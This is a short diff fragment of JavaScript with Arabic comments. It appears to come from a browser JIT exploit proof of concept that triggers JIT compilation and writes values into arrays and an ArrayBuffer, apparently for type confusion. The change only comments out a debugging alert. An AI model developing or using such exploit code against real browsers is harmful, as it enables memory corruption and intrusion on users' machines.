@@ -8,7 +8,7 @@ function Target(Special, Idx, Value) {
     Special.slice(); // يحفز الـ JIT
     Arr[Idx] = Value; // كتابة القيمة النهائية
     y[0] = Arr[Idx]; // محاولة كتابة في ArrayBuffer
-    alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16) + ', y[0] = ' + y[0].toString(16));
+    //alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16) + ', y[0] = ' + y[0].toString(16));
 }
 
 class SoSpecial extends Array {
